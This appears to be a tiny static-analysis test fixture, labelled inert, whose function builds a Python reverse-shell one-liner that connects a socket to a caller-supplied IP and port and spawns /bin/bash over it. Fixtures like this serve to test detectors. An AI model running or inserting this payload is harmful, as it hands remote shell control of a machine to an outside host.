# Inert static-analysis fixture. Do not execute.
def build(ip: str, port: int):
    return f'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\''
